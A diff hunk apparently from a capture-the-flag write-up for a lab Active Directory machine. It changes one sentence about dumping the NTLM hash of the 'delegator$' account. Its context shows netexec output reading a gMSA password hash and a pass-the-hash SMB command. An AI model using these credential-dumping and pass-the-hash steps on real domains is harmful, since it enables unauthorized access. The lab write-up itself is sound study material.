@@ -431,7 +431,7 @@ LDAP        10.129.14.17    389    DC01             [+] rebound.htb\tbrady:543BO
 LDAP        10.129.14.17    389    DC01             [*] Getting GMSA Passwords
 LDAP        10.129.14.17    389    DC01             Account: delegator$           NTLM: aafb74ba2eb5e5ff7003a9a54ad1f904     PrincipalsAllowedToReadPassword: tbrady
 ```
-I have dumped the NTLM of the `delegator$` machine account
+I have dumped the NTLM of the `delegator$` account
 
 ```python
 nxc smb dc01.rebound.htb -u 'delegator$' -H 'aafb74ba2eb5e5ff7003a9a54ad1f904'
